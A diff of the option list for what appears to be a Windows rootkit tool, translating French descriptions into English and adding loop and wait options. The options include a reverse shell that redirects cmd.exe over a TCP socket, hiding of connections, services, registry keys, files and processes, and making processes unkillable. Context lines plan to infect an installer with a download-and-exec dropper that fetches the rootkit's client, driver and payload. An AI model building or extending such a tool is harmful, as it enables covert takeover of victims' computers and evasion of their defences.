@@ -16,14 +16,16 @@ Driver packer/unpacker				-> je vais le stocker au cul du client.exe
 									aisement etre utilise dans une strategie Download and Exec
 
 Todo options:
---tcpshell <IP> <PORT>				-> Creer une connection TCP, ouvrir un cmd.exe avec ses i/o rediriges sur le socket
---hport <PORT> <PROTOCOLE/all>		-> masquer une connection TCP et/ou UDP
---hs <me/SERVICE>					-> masquer un service par son nom
---hk <me/KEY>						-> masquer une cle de registre
---hf <me/FILENAME>					-> hider le dossier contenant le driver
---hp <me/PID/NAME>
---im <me/PID/NAME>					-> rendre immortel un processus
+--tcpshell <IP> <PORT>				-> Open TCP connection, start cmd.exe with i/o redirected on socket fd
+--hport <PORT> <PROTOCOLE/all>		-> hide TCP and/or UDP connection
+--hs <me/SERVICE>					-> hide service by name
+--hk <me/KEY>						-> hide registry key
+--hf <me/FILENAME>					-> hide file by name
+--hp <me/PID/NAME>					-> hide process by name or pid
+--im <me/PID/NAME>					-> set a process immortal by name or pid
 --log <err/warn/all> <LOGFILE>		-> log
+--loop <0/NBLOOP>					-> loop commands (0 = infiny)
+--wait <USEC>						-> wait USEC micro-seconds
 
 Infecter (packer - jambiKeepSize) un installeur avec un download and exec
 qui va chercher le pack (client + driver + payload)
